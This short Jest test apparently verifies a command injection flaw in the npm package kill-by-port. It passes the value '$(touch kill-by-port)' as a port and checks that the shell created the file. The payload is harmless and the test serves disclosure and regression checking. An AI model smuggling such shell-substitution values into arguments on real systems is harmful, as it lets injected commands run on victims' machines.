test("Command Injection in kill-by-port", () => {
  expect.assertions(2);
  const kill_by_port = require("kill-by-port");
  const fs = require("fs");
  const path = "./kill-by-port";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_by_port.killByPort("$(touch kill-by-port)");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
